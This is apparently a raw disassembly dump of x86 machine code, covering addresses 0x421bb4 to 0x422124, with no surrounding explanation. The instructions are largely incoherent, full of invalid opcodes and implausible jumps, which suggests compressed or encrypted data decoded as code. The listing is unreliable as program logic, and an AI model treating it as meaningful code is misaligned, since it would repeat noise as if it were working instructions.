  421bb4:	57 9a 23 7b 
  421bb8:	dc 18                	fcompl (%eax)
  421bba:	b5 4f                	mov    $0x4f,%ch
  421bbc:	4b                   	dec    %ebx
  421bbd:	6f                   	outsl  %ds:(%esi),(%dx)
  421bbe:	5b                   	pop    %ebx
  421bbf:	4f                   	dec    %edi
  421bc0:	aa                   	stos   %al,%es:(%edi)
  421bc1:	87 39                	xchg   %edi,(%ecx)
  421bc3:	10 50 ad             	adc    %dl,-0x53(%eax)
  421bc6:	5d                   	pop    %ebp
  421bc7:	dc 7b d9             	fdivrl -0x27(%ebx)
  421bca:	be 3d 97 c4 17       	mov    $0x17c4973d,%esi
  421bcf:	21 d8                	and    %ebx,%eax
  421bd1:	89 df                	mov    %ebx,%edi
  421bd3:	04 c8                	add    $0xc8,%al
  421bd5:	6c                   	insb   (%dx),%es:(%edi)
  421bd6:	ad                   	lods   %ds:(%esi),%eax
  421bd7:	01 8e bf ff 04 85    	add    %ecx,-0x7afb0041(%esi)
  421bdd:	60                   	pusha
  421bde:	d1 8e 28 a6 ed 59    	rorl   $1,0x59eda628(%esi)
  421be4:	9b                   	fwait
  421be5:	ac                   	lods   %ds:(%esi),%al
  421be6:	a0 c6 40 00 94       	mov    0x940040c6,%al
  421beb:	89 c5                	mov    %eax,%ebp
  421bed:	81 ea ce 1a 3f 37    	sub    $0x373f1ace,%edx
  421bf3:	4c                   	dec    %esp
  421bf4:	79 10                	jns    0x421c06
  421bf6:	2e 08 5d 70          	or     %bl,%cs:0x70(%ebp)
  421bfa:	84 71 5d             	test   %dh,0x5d(%ecx)
  421bfd:	b2 04                	mov    $0x4,%dl
  421bff:	0b 06                	or     (%esi),%eax
  421c01:	3f                   	aas
  421c02:	fb                   	sti
  421c03:	f0 19 82 a6 4f df 8e 	lock sbb %eax,-0x7120b05a(%edx)
  421c0a:	53                   	push   %ebx
  421c0b:	18 76 87             	sbb    %dh,-0x79(%esi)
  421c0e:	ca e1 be             	lret   $0xbee1
  421c11:	3d ce 5d 5d c2       	cmp    $0xc25d5dce,%eax
  421c16:	4f                   	dec    %edi
  421c17:	9e                   	sahf
  421c18:	0c 93                	or     $0x93,%al
  421c1a:	3c 88                	cmp    $0x88,%al
  421c1c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  421c1d:	db 27                	(bad) (%edi)
  421c1f:	2a 1b                	sub    (%ebx),%bl
  421c21:	f0 10 0b             	lock adc %cl,(%ebx)
  421c24:	e9 9f f1 70 1d       	jmp    0x1db30dc8
  421c29:	a2 a2 57 67 d8       	mov    %al,0xd86757a2
  421c2e:	56                   	push   %esi
  421c2f:	b0 3a                	mov    $0x3a,%al
  421c31:	1b 84 cc 49 de 7a 08 	sbb    0x87ade49(%esp,%ecx,8),%eax
  421c38:	e7 b3                	out    %eax,$0xb3
  421c3a:	c0 2e ee             	shrb   $0xee,(%esi)
  421c3d:	6e                   	outsb  %ds:(%esi),(%dx)
  421c3e:	2e 3f                	cs aas
  421c40:	72 c4                	jb     0x421c06
  421c42:	d4 8c                	aam    $0x8c
  421c44:	0b 7f 63             	or     0x63(%edi),%edi
  421c47:	09 f3                	or     %esi,%ebx
  421c49:	27                   	daa
  421c4a:	77 85                	ja     0x421bd1
  421c4c:	7d bf                	jge    0x421c0d
  421c4e:	4d                   	dec    %ebp
  421c4f:	dd 34 c1             	fnsave (%ecx,%eax,8)
  421c52:	39 09                	cmp    %ecx,(%ecx)
  421c54:	bb 04 71 f2 ad       	mov    $0xadf27104,%ebx
  421c59:	d1 d0                	rcl    $1,%eax
  421c5b:	db df                	fcmovnu %st(7),%st
  421c5d:	c8 0c b5 a9          	enter  $0xb50c,$0xa9
  421c61:	6d                   	insl   (%dx),%es:(%edi)
  421c62:	5a                   	pop    %edx
  421c63:	ca 2f 60             	lret   $0x602f
  421c66:	fb                   	sti
  421c67:	4e                   	dec    %esi
  421c68:	01 7f bf             	add    %edi,-0x41(%edi)
  421c6b:	fd                   	std
  421c6c:	d7                   	xlat   %ds:(%ebx)
  421c6d:	7f a8                	jg     0x421c17
  421c6f:	96                   	xchg   %eax,%esi
  421c70:	69 63 41 d9 a6 6d b2 	imul   $0xb26da6d9,0x41(%ebx),%esp
  421c77:	b4 0f                	mov    $0xf,%ah
  421c79:	21 40 2a             	and    %eax,0x2a(%eax)
  421c7c:	1f                   	pop    %ds
  421c7d:	f8                   	clc
  421c7e:	a3 57 cb dc a1       	mov    %eax,0xa1dccb57
  421c83:	a2 ee ce 66 ac       	mov    %al,0xac66ceee
  421c88:	3e 50                	ds push %eax
  421c8a:	aa                   	stos   %al,%es:(%edi)
  421c8b:	af                   	scas   %es:(%edi),%eax
  421c8c:	74 9a                	je     0x421c28
  421c8e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  421c8f:	c9                   	leave
  421c90:	01 19                	add    %ebx,(%ecx)
  421c92:	b5 ab                	mov    $0xab,%ch
  421c94:	38 ce                	cmp    %cl,%dh
  421c96:	11 0d d1 c5 42 5e    	adc    %ecx,0x5e42c5d1
  421c9c:	d9 8f 10 7a 35 6f    	(bad) 0x6f357a10(%edi)
  421ca2:	19 5d 26             	sbb    %ebx,0x26(%ebp)
  421ca5:	b1 1f                	mov    $0x1f,%cl
  421ca7:	4d                   	dec    %ebp
  421ca8:	f0 4e                	lock dec %esi
  421caa:	68 de 48 83 3d       	push   $0x3d8348de
  421caf:	75 ec                	jne    0x421c9d
  421cb1:	ed                   	in     (%dx),%eax
  421cb2:	ff                   	(bad)
  421cb3:	3d df 3c 89 32       	cmp    $0x32893cdf,%eax
  421cb8:	7e 85                	jle    0x421c3f
  421cba:	93                   	xchg   %eax,%ebx
  421cbb:	d8 6e 89             	fsubrs -0x77(%esi)
  421cbe:	aa                   	stos   %al,%es:(%edi)
  421cbf:	92                   	xchg   %eax,%edx
  421cc0:	e8 8a d8 99 02       	call   0x2dbf54f
  421cc5:	2b 39                	sub    (%ecx),%edi
  421cc7:	cc                   	int3
  421cc8:	1d 32 84 44 d2       	sbb    $0xd2448432,%eax
  421ccd:	ad                   	lods   %ds:(%esi),%eax
  421cce:	dd 12                	fstl   (%edx)
  421cd0:	e5 fa                	in     $0xfa,%eax
  421cd2:	1c 74                	sbb    $0x74,%al
  421cd4:	26 dd b5 a1 94 2e f8 	fnsave %es:-0x7d16b5f(%ebp)
  421cdb:	db b9 85 9b 36 48    	fstpt  0x48369b85(%ecx)
  421ce1:	3a 3f                	cmp    (%edi),%bh
  421ce3:	4e                   	dec    %esi
  421ce4:	a2 45 5c e4 d4       	mov    %al,0xd4e45c45
  421ce9:	dc 1d 13 5c d5 59    	fcompl 0x59d55c13
  421cef:	a2 7e ff 42 5c       	mov    %al,0x5c42ff7e
  421cf4:	d9 8f 13 45 9c f3    	(bad) -0xc63baed(%edi)
  421cfa:	05 a8 56 b0 3c       	add    $0x3cb056a8,%eax
  421cff:	37                   	aaa
  421d00:	f3 70 1f             	repz jo 0x421d22
  421d03:	c7                   	(bad)
  421d04:	e0 4d                	loopne 0x421d53
  421d06:	f8                   	clc
  421d07:	3a bc 0a 85 20 b9 f0 	cmp    -0xf46df7b(%edx,%ecx,1),%bh
  421d0e:	5a                   	pop    %edx
  421d0f:	b1 b1                	mov    $0xb1,%cl
  421d11:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  421d12:	67 aa                	stos   %al,%es:(%di)
  421d14:	cb                   	lret
  421d15:	f3 b8 e4 d3 4a 03    	repz mov $0x34ad3e4,%eax
  421d1b:	ed                   	in     (%dx),%eax
  421d1c:	97                   	xchg   %eax,%edi
  421d1d:	81 b0 4e 69 9e ee 84 	xorl   $0xaa0ace84,-0x116196b2(%eax)
  421d24:	ce 0a aa 
  421d27:	18 d6                	sbb    %dl,%dh
  421d29:	ea d0 26 64 f2 5f 3e 	ljmp   $0x3e5f,$0xf26426d0
  421d30:	5b                   	pop    %ebx
  421d31:	6c                   	insb   (%dx),%es:(%edi)
  421d32:	69 ea 1a 50 23 85    	imul   $0x8523501a,%edx,%ebp
  421d38:	bc 42 a1 b1 f1       	mov    $0xf1b1a142,%esp
  421d3d:	2a c4                	sub    %ah,%al
  421d3f:	7d 36                	jge    0x421d77
  421d41:	f4                   	hlt
  421d42:	48                   	dec    %eax
  421d43:	3a 62 3d             	cmp    0x3d(%edx),%ah
  421d46:	29 48 3a             	sub    %ecx,0x3a(%eax)
  421d49:	bf 00 1a 29 8d       	mov    $0x8d291a00,%edi
  421d4e:	6c                   	insb   (%dx),%es:(%edi)
  421d4f:	01 00                	add    %eax,(%eax)
  421d51:	ea 64 08 26 f8 32 3f 	ljmp   $0x3f32,$0xf8260864
  421d58:	6e                   	outsb  %ds:(%esi),(%dx)
  421d59:	98                   	cwtl
  421d5a:	7b 07                	jnp    0x421d63
  421d5c:	2b a9 7f dd af b1    	sub    -0x4e502281(%ecx),%ebp
  421d62:	dd 3a                	fnstsw (%edx)
  421d64:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  421d65:	e0 dd                	loopne 0x421d44
  421d67:	ef                   	out    %eax,(%dx)
  421d68:	bc 79 82 48 b8       	mov    $0xb8488279,%esp
  421d6d:	40                   	inc    %eax
  421d6e:	72 1a                	jb     0x421d8a
  421d70:	30 2d 8b 7d 6a 2e    	xor    %ch,0x2e6a7d8b
  421d76:	63 aa fe f7 d7 8e    	arpl   %ebp,-0x71280802(%edx)
  421d7c:	4d                   	dec    %ebp
  421d7d:	6b c7 1d             	imul   $0x1d,%edi,%eax
  421d80:	f1                   	int1
  421d81:	77 88                	ja     0x421d0b
  421d83:	72 70                	jb     0x421df5
  421d85:	56                   	push   %esi
  421d86:	ae                   	scas   %es:(%edi),%al
  421d87:	0b 7b 0a             	or     0xa(%ebx),%edi
  421d8a:	9f                   	lahf
  421d8b:	8c 99 1e 99 e9 e2    	mov    %ds,-0x1d1666e2(%ecx)
  421d91:	73 ef                	jae    0x421d82
  421d93:	b5 f9                	mov    $0xf9,%ch
  421d95:	c0 77 2c 33          	shlb   $0x33,0x2c(%edi)
  421d99:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  421d9a:	b5 9f                	mov    $0x9f,%ch
  421d9c:	d3 8e 37 2f 13 c4    	rorl   %cl,-0x3becd0c9(%esi)
  421da2:	68 d4 d6 59 38       	push   $0x3859d6d4
  421da7:	40                   	inc    %eax
  421da8:	65 78 dc             	gs js  0x421d87
  421dab:	26 11 57 42          	adc    %edx,%es:0x42(%edi)
  421daf:	bc 49 08 1c bd       	mov    $0xbd1c0849,%esp
  421db4:	ed                   	in     (%dx),%eax
  421db5:	eb c0                	jmp    0x421d77
  421db7:	85 e5                	test   %esp,%ebp
  421db9:	7a 7d                	jp     0x421e38
  421dbb:	4a                   	dec    %edx
  421dbc:	0e                   	push   %cs
  421dbd:	ca f4 f5             	lret   $0xf5f4
  421dc0:	71 14                	jno    0x421dd6
  421dc2:	99                   	cltd
  421dc3:	b0 33                	mov    $0x33,%al
  421dc5:	f5                   	cmc
  421dc6:	4c                   	dec    %esp
  421dc7:	e1 c1                	loope  0x421d8a
  421dc9:	8e 6c 6d dc          	mov    -0x24(%ebp,%ebp,2),%gs
  421dcd:	b9 69 85 b8 99       	mov    $0x99b88569,%ecx
  421dd2:	16                   	push   %ss
  421dd3:	c4 9a 98 84 ba 4e    	les    0x4eba8498(%edx),%ebx
  421dd9:	27                   	daa
  421dda:	91                   	xchg   %eax,%ecx
  421ddb:	93                   	xchg   %eax,%ebx
  421ddc:	9f                   	lahf
  421ddd:	4d                   	dec    %ebp
  421dde:	97                   	xchg   %eax,%edi
  421ddf:	2b 23                	sub    (%ebx),%esp
  421de1:	5b                   	pop    %ebx
  421de2:	08 2f                	or     %ch,(%edi)
  421de4:	02 60 50             	add    0x50(%eax),%ah
  421de7:	0d d4 3b 3c 84       	or     $0x843c3bd4,%eax
  421dec:	e6 63                	out    %al,$0x63
  421dee:	bd ef 65 10 92       	mov    $0x921065ef,%ebp
  421df3:	74 ab                	je     0x421da0
  421df5:	29 7d 12             	sub    %edi,0x12(%ebp)
  421df8:	3d 84 dc f7 5e       	cmp    $0x5ef7dc84,%eax
  421dfd:	d9 a5 98 81 f2 87    	fldenv -0x780d7e68(%ebp)
  421e03:	99                   	cltd
  421e04:	d3 ff                	sar    %cl,%edi
  421e06:	54                   	push   %esp
  421e07:	81 d3 6b 50 dd 9a    	adc    $0x9add506b,%ebx
  421e0d:	4f                   	dec    %edi
  421e0e:	8f a9 5d fa          	(bad)
  421e12:	6d                   	insl   (%dx),%es:(%edi)
  421e13:	68 6a 8b a5 a4       	push   $0xa4a58b6a
  421e18:	41                   	inc    %ecx
  421e19:	55                   	push   %ebp
  421e1a:	fc                   	cld
  421e1b:	f5                   	cmc
  421e1c:	34 80                	xor    $0x80,%al
  421e1e:	ad                   	lods   %ds:(%esi),%eax
  421e1f:	93                   	xchg   %eax,%ebx
  421e20:	78 67                	js     0x421e89
  421e22:	c1 62 46 cb          	shll   $0xcb,0x46(%edx)
  421e26:	c5 80 84 a2 87 95    	lds    -0x6a785d7c(%eax),%eax
  421e2c:	8e 72 b6             	mov    -0x4a(%edx),%?
  421e2f:	2e 5b                	cs pop %ebx
  421e31:	bb e1 0c 7e 94       	mov    $0x947e0ce1,%ebx
  421e36:	48                   	dec    %eax
  421e37:	f7 e8                	imul   %eax
  421e39:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  421e3a:	37                   	aaa
  421e3b:	fb                   	sti
  421e3c:	e6 4a                	out    %al,$0x4a
  421e3e:	c7                   	(bad)
  421e3f:	5a                   	pop    %edx
  421e40:	02 8a 4f 2f 4d 16    	add    0x164d2f4f(%edx),%cl
  421e46:	b6 f3                	mov    $0xf3,%dh
  421e48:	85 04 6b             	test   %eax,(%ebx,%ebp,2)
  421e4b:	b7 71                	mov    $0x71,%bh
  421e4d:	96                   	xchg   %eax,%esi
  421e4e:	ee                   	out    %al,(%dx)
  421e4f:	46                   	inc    %esi
  421e50:	69 db 11 8f 71 da    	imul   $0xda718f11,%ebx,%ebx
  421e56:	56                   	push   %esi
  421e57:	0e                   	push   %cs
  421e58:	65 b5 44             	gs mov $0x44,%ch
  421e5b:	fa                   	cli
  421e5c:	96                   	xchg   %eax,%esi
  421e5d:	2a b4 01 33 8a ad ed 	sub    -0x125275cd(%ecx,%eax,1),%dh
  421e64:	6a ef                	push   $0xffffffef
  421e66:	c7                   	(bad)
  421e67:	68 37 5f ad ac       	push   $0xacad5f37
  421e6c:	56                   	push   %esi
  421e6d:	41                   	inc    %ecx
  421e6e:	cb                   	lret
  421e6f:	ba dd e5 5a e1       	mov    $0xe15ae5dd,%edx
  421e74:	02 e2                	add    %dl,%ah
  421e76:	5c                   	pop    %esp
  421e77:	af                   	scas   %es:(%edi),%eax
  421e78:	bc 0f 66 96 1d       	mov    $0x1d96660f,%esp
  421e7d:	47                   	inc    %edi
  421e7e:	06                   	push   %es
  421e7f:	55                   	push   %ebp
  421e80:	14 20                	adc    $0x20,%al
  421e82:	ab                   	stos   %eax,%es:(%edi)
  421e83:	b3 b0                	mov    $0xb0,%bl
  421e85:	e2 33                	loop   0x421eba
  421e87:	91                   	xchg   %eax,%ecx
  421e88:	8f                   	(bad)
  421e89:	df d4                	(bad)
  421e8b:	ab                   	stos   %eax,%es:(%edi)
  421e8c:	97                   	xchg   %eax,%edi
  421e8d:	3a 1d 80 9c 59 be    	cmp    0xbe599c80,%bl
  421e93:	24 20                	and    $0x20,%al
  421e95:	bb 40 e7 7f 8a       	mov    $0x8a7fe740,%ebx
  421e9a:	f5                   	cmc
  421e9b:	b7 b3                	mov    $0xb3,%bh
  421e9d:	92                   	xchg   %eax,%edx
  421e9e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  421e9f:	49                   	dec    %ecx
  421ea0:	31 ac cd e9 f1 e5 fb 	xor    %ebp,-0x41a0e17(%ebp,%ecx,8)
  421ea7:	af                   	scas   %es:(%edi),%eax
  421ea8:	95                   	xchg   %eax,%ebp
  421ea9:	2f                   	das
  421eaa:	79 7e                	jns    0x421f2a
  421eac:	87 44 12 24          	xchg   %eax,0x24(%edx,%edx,1)
  421eb0:	9e                   	sahf
  421eb1:	79 f9                	jns    0x421eac
  421eb3:	3a e7                	cmp    %bh,%ah
  421eb5:	e4 76                	in     $0x76,%al
  421eb7:	21 cb                	and    %ecx,%ebx
  421eb9:	a1 e0 82 e2 e2       	mov    0xe2e282e0,%eax
  421ebe:	0f a3 0d 66 77 c2 29 	bt     %ecx,0x29c27766
  421ec5:	06                   	push   %es
  421ec6:	20 d4                	and    %dl,%ah
  421ec8:	e5 2c                	in     $0x2c,%eax
  421eca:	c6                   	(bad)
  421ecb:	c9                   	leave
  421ecc:	8a 1a                	mov    (%edx),%bl
  421ece:	12 95 ba 4d 8d 8e    	adc    -0x7172b246(%ebp),%dl
  421ed4:	19 29                	sbb    %ebp,(%ecx)
  421ed6:	43                   	inc    %ebx
  421ed7:	86 e0                	xchg   %ah,%al
  421ed9:	f8                   	clc
  421eda:	e5 2a                	in     $0x2a,%eax
  421edc:	a9 db 50 a7 1d       	test   $0x1da750db,%eax
  421ee1:	a1 23 a4 61 41       	mov    0x4161a423,%eax
  421ee6:	75 c8                	jne    0x421eb0
  421ee8:	d4 20                	aam    $0x20
  421eea:	47                   	inc    %edi
  421eeb:	fd                   	std
  421eec:	2e 74 e7             	je,pn  0x421ed6
  421eef:	e4 47                	in     $0x47,%al
  421ef1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  421ef2:	1f                   	pop    %ds
  421ef3:	55                   	push   %ebp
  421ef4:	0b 14 98             	or     (%eax,%ebx,4),%edx
  421ef7:	fc                   	cld
  421ef8:	dc 79 89             	fdivrl -0x77(%ecx)
  421efb:	1a 5c 6e 84          	sbb    -0x7c(%esi,%ebp,2),%bl
  421eff:	02 7c 01 e7          	add    -0x19(%ecx,%eax,1),%bh
  421f03:	47                   	inc    %edi
  421f04:	df c9                	(bad)
  421f06:	19 08                	sbb    %ecx,(%eax)
  421f08:	d8 2f                	fsubrs (%edi)
  421f0a:	88 f5                	mov    %dh,%ch
  421f0c:	dd 36                	fnsave (%esi)
  421f0e:	92                   	xchg   %eax,%edx
  421f0f:	7a f4                	jp     0x421f05
  421f11:	1f                   	pop    %ds
  421f12:	62 ab fd 81 73 a8    	bound  %ebp,-0x578c7e03(%ebx)
  421f18:	01 40 02             	add    %eax,0x2(%eax)
  421f1b:	e6 53                	out    %al,$0x53
  421f1d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  421f1e:	dd d6                	fst    %st(6)
  421f20:	41                   	inc    %ecx
  421f21:	f1                   	int1
  421f22:	81 48 c2 87 e8 ed b4 	orl    $0xb4ede887,-0x3e(%eax)
  421f29:	58                   	pop    %eax
  421f2a:	5d                   	pop    %ebp
  421f2b:	fe                   	(bad)
  421f2c:	b6 41                	mov    $0x41,%dh
  421f2e:	36 ba 89 54 55 55    	ss mov $0x55555489,%edx
  421f34:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  421f35:	ae                   	scas   %es:(%edi),%al
  421f36:	4e                   	dec    %esi
  421f37:	18 fb                	sbb    %bh,%bl
  421f39:	84 49 ef             	test   %cl,-0x11(%ecx)
  421f3c:	4e                   	dec    %esi
  421f3d:	80 6b 92 fc          	subb   $0xfc,-0x6e(%ebx)
  421f41:	36 d5 e6             	ss aad $0xe6
  421f44:	19 c6                	sbb    %eax,%esi
  421f46:	5b                   	pop    %ebx
  421f47:	b2 48                	mov    $0x48,%dl
  421f49:	4a                   	dec    %edx
  421f4a:	fc                   	cld
  421f4b:	13 45 88             	adc    -0x78(%ebp),%eax
  421f4e:	bb 36 a4 87 e0       	mov    $0xe087a436,%ebx
  421f53:	eb 02                	jmp    0x421f57
  421f55:	6b 1f d0             	imul   $0xffffffd0,(%edi),%ebx
  421f58:	4d                   	dec    %ebp
  421f59:	e7 ad                	out    %eax,$0xad
  421f5b:	74 55                	je     0x421fb2
  421f5d:	59                   	pop    %ecx
  421f5e:	f7 d7                	not    %edi
  421f60:	cf                   	iret
  421f61:	d7                   	xlat   %ds:(%ebx)
  421f62:	a1 d0 d5 eb 16       	mov    0x16ebd5d0,%eax
  421f67:	d2 e0                	shl    %cl,%al
  421f69:	26 e5 ec             	es in  $0xec,%eax
  421f6c:	86 bd 38 c6 ed 25    	xchg   %bh,0x25edc638(%ebp)
  421f72:	de 53 95             	ficoms -0x6b(%ebx)
  421f75:	5d                   	pop    %ebp
  421f76:	44                   	inc    %esp
  421f77:	fb                   	sti
  421f78:	d8 28                	fsubrs (%eax)
  421f7a:	55                   	push   %ebp
  421f7b:	93                   	xchg   %eax,%ebx
  421f7c:	31 a5 d3 cf 01 19    	xor    %esp,0x1901cfd3(%ebp)
  421f82:	e0 b7                	loopne 0x421f3b
  421f84:	ee                   	out    %al,(%dx)
  421f85:	92                   	xchg   %eax,%edx
  421f86:	ca b8 5b             	lret   $0x5bb8
  421f89:	2e 11 df             	cs adc %ebx,%edi
  421f8c:	e6 9d                	out    %al,$0x9d
  421f8e:	4a                   	dec    %edx
  421f8f:	f9                   	stc
  421f90:	0b 12                	or     (%edx),%edx
  421f92:	7c 22                	jl     0x421fb6
  421f94:	7a b2                	jp     0x421f48
  421f96:	eb d8                	jmp    0x421f70
  421f98:	6c                   	insb   (%dx),%es:(%edi)
  421f99:	77 16                	ja     0x421fb1
  421f9b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  421f9c:	be 29 25 03 65       	mov    $0x65032529,%esi
  421fa1:	54                   	push   %esp
  421fa2:	21 a0 b8 95 44 e9    	and    %esp,-0x16bb6a48(%eax)
  421fa8:	5c                   	pop    %esp
  421fa9:	03 1d eb 6c e8 74    	add    0x74e86ceb,%ebx
  421faf:	fd                   	std
  421fb0:	de 05 93 81 ea 5e    	fiadds 0x5eea8193
  421fb6:	d5 bd                	aad    $0xbd
  421fb8:	1d f4 1a 70 3f       	sbb    $0x3f701af4,%eax
  421fbd:	d7                   	xlat   %ds:(%ebx)
  421fbe:	0a fa                	or     %dl,%bh
  421fc0:	af                   	scas   %es:(%edi),%eax
  421fc1:	39 36                	cmp    %esi,(%esi)
  421fc3:	26 3e 87 6f 7f       	es xchg %ebp,%ds:0x7f(%edi)
  421fc8:	9c                   	pushf
  421fc9:	04 35                	add    $0x35,%al
  421fcb:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  421fcc:	3b 2e                	cmp    (%esi),%ebp
  421fce:	d7                   	xlat   %ds:(%ebx)
  421fcf:	95                   	xchg   %eax,%ebp
  421fd0:	1b 65 b3             	sbb    -0x4d(%ebp),%esp
  421fd3:	7c d6                	jl     0x421fab
  421fd5:	53                   	push   %ebx
  421fd6:	9f                   	lahf
  421fd7:	a3 01 ab 9f ca       	mov    %eax,0xca9fab01
  421fdc:	17                   	pop    %ss
  421fdd:	17                   	pop    %ss
  421fde:	e4 12                	in     $0x12,%al
  421fe0:	0f f0                	(bad)
  421fe2:	8a 8d 71 d1 c2 aa    	mov    -0x553d2e8f(%ebp),%cl
  421fe8:	94                   	xchg   %eax,%esp
  421fe9:	21 dd                	and    %ebx,%ebp
  421feb:	eb dc                	jmp    0x421fc9
  421fed:	ba ca 15 14 94       	mov    $0x941415ca,%edx
  421ff2:	bf 4d c8 12 26       	mov    $0x2612c84d,%edi
  421ff7:	1a 08                	sbb    (%eax),%cl
  421ff9:	94                   	xchg   %eax,%esp
  421ffa:	f9                   	stc
  421ffb:	37                   	aaa
  421ffc:	73 ee                	jae    0x421fec
  421ffe:	c1 2a 00             	shrl   $0x0,(%edx)
  422001:	2d 5b d2 63 f4       	sub    $0xf463d25b,%eax
  422006:	b8 1d 65 27 8e       	mov    $0x8e27651d,%eax
  42200b:	47                   	inc    %edi
  42200c:	35 b8 9a 0f 58       	xor    $0x580f9ab8,%eax
  422011:	45                   	inc    %ebp
  422012:	33 b9 37 61 c7 80    	xor    -0x7f389ec9(%ecx),%edi
  422018:	1f                   	pop    %ds
  422019:	37                   	aaa
  42201a:	f4                   	hlt
  42201b:	fb                   	sti
  42201c:	5b                   	pop    %ebx
  42201d:	47                   	inc    %edi
  42201e:	b7 f5                	mov    $0xf5,%bh
  422020:	41                   	inc    %ecx
  422021:	c4                   	(bad)
  422022:	dc b0 51 f3 ea ca    	fdivl  -0x35150caf(%eax)
  422028:	37                   	aaa
  422029:	29 38                	sub    %edi,(%eax)
  42202b:	d9 e3                	(bad)
  42202d:	4a                   	dec    %edx
  42202e:	c9                   	leave
  42202f:	07                   	pop    %es
  422030:	79 30                	jns    0x422062
  422032:	0b 2c 9a             	or     (%edx,%ebx,4),%ebp
  422035:	48                   	dec    %eax
  422036:	4e                   	dec    %esi
  422037:	0d 1e 64 e7 16       	or     $0x16e7641e,%eax
  42203c:	c6                   	(bad)
  42203d:	28 72 9d             	sub    %dh,-0x63(%edx)
  422040:	43                   	inc    %ebx
  422041:	0f 5a 57 45          	cvtps2pd 0x45(%edi),%xmm2
  422045:	4a                   	dec    %edx
  422046:	6d                   	insl   (%dx),%es:(%edi)
  422047:	0e                   	push   %cs
  422048:	9f                   	lahf
  422049:	4b                   	dec    %ebx
  42204a:	8d b5 35 f7 2e 85    	lea    -0x7ad108cb(%ebp),%esi
  422050:	18 5c e5 f4          	sbb    %bl,-0xc(%ebp,%eiz,8)
  422054:	ef                   	out    %eax,(%dx)
  422055:	8b 25 41 a2 af cc    	mov    0xccafa241,%esp
  42205b:	6c                   	insb   (%dx),%es:(%edi)
  42205c:	42                   	inc    %edx
  42205d:	53                   	push   %ebx
  42205e:	f7 84 3a 8c 0b 9e b1 	testl  $0x66d3e727,-0x4e61f474(%edx,%edi,1)
  422065:	27 e7 d3 66 
  422069:	01 ec                	add    %ebp,%esp
  42206b:	cd 65                	int    $0x65
  42206d:	61                   	popa
  42206e:	0e                   	push   %cs
  42206f:	4a                   	dec    %edx
  422070:	ab                   	stos   %eax,%es:(%edi)
  422071:	24 c9                	and    $0xc9,%al
  422073:	71 9a                	jno    0x42200f
  422075:	3e 0a 21             	or     %ds:(%ecx),%ah
  422078:	00 d9                	add    %bl,%cl
  42207a:	f4                   	hlt
  42207b:	ba 9d 12 d2 dd       	mov    $0xddd2129d,%edx
  422080:	cf                   	iret
  422081:	c4 e7 13 35          	(bad)
  422085:	fd                   	std
  422086:	9b                   	fwait
  422087:	a8 8c                	test   $0x8c,%al
  422089:	8f                   	(bad)
  42208a:	e0 03                	loopne 0x42208f
  42208c:	6b 7b cc 9c          	imul   $0xffffff9c,-0x34(%ebx),%edi
  422090:	18 22                	sbb    %ah,(%edx)
  422092:	90                   	nop
  422093:	d6                   	salc
  422094:	b3 f0                	mov    $0xf0,%bl
  422096:	c0 3c b1 ca          	sarb   $0xca,(%ecx,%esi,4)
  42209a:	3e d0 ed             	ds shr $1,%ch
  42209d:	40                   	inc    %eax
  42209e:	3b b3 95 69 47 f8    	cmp    -0x7b8966b(%ebx),%esi
  4220a4:	c2 99 4f             	ret    $0x4f99
  4220a7:	15 3c 3c 67 7d       	adc    $0x7d673c3c,%eax
  4220ac:	95                   	xchg   %eax,%ebp
  4220ad:	ec                   	in     (%dx),%al
  4220ae:	48                   	dec    %eax
  4220af:	59                   	pop    %ecx
  4220b0:	67 72 6c             	addr16 jb 0x42211f
  4220b3:	d6                   	salc
  4220b4:	89 bc 09 70 79 c2 f9 	mov    %edi,-0x63d8690(%ecx,%ecx,1)
  4220bb:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4220bc:	ae                   	scas   %es:(%edi),%al
  4220bd:	ba 96 25 67 23       	mov    $0x23672596,%edx
  4220c2:	9b                   	fwait
  4220c3:	cd bf                	int    $0xbf
  4220c5:	e3 2f                	jecxz  0x4220f6
  4220c7:	db 74 59 eb          	(bad) -0x15(%ecx,%ebx,2)
  4220cb:	21 8b 02 12 17 52    	and    %ecx,0x52171202(%ebx)
  4220d1:	b9 63 b9 dd a9       	mov    $0xa9ddb963,%ecx
  4220d6:	d6                   	salc
  4220d7:	96                   	xchg   %eax,%esi
  4220d8:	c9                   	leave
  4220d9:	48                   	dec    %eax
  4220da:	61                   	popa
  4220db:	57                   	push   %edi
  4220dc:	be 84 56 5d 40       	mov    $0x405d5684,%esi
  4220e1:	04 38                	add    $0x38,%al
  4220e3:	d8 13                	fcoms  (%ebx)
  4220e5:	05 10 d6 91 26       	add    $0x2691d610,%eax
  4220ea:	ac                   	lods   %ds:(%esi),%al
  4220eb:	99                   	cltd
  4220ec:	c6                   	(bad)
  4220ed:	b5 c8                	mov    $0xc8,%ch
  4220ef:	54                   	push   %esp
  4220f0:	45                   	inc    %ebp
  4220f1:	7c 3e                	jl     0x422131
  4220f3:	7c ef                	jl     0x4220e4
  4220f5:	a9 a0 3b 6c 32       	test   $0x326c3ba0,%eax
  4220fa:	ca 6b 89             	lret   $0x896b
  4220fd:	38 c7                	cmp    %al,%bh
  4220ff:	11 7a e5             	adc    %edi,-0x1b(%edx)
  422102:	78 ad                	js     0x4220b1
  422104:	c9                   	leave
  422105:	49                   	dec    %ecx
  422106:	e8 7d 64 99 59       	call   0x59db8588
  42210b:	7a d8                	jp     0x4220e5
  42210d:	9d                   	popf
  42210e:	2b 96 1a 5d 96 c8    	sub    -0x3769a2e6(%esi),%edx
  422114:	b7 10                	mov    $0x10,%bh
  422116:	e2 6c                	loop   0x422184
  422118:	ec                   	in     (%dx),%al
  422119:	77 f0                	ja     0x42210b
  42211b:	33 e6                	xor    %esi,%esp
  42211d:	fc                   	cld
  42211e:	c7                   	(bad)
  42211f:	57                   	push   %edi
  422120:	79 bc                	jns    0x4220de
  422122:	9d                   	popf
  422123:	cf                   	iret
  422124:	c2 0c 3e             	ret    $0x3e0c
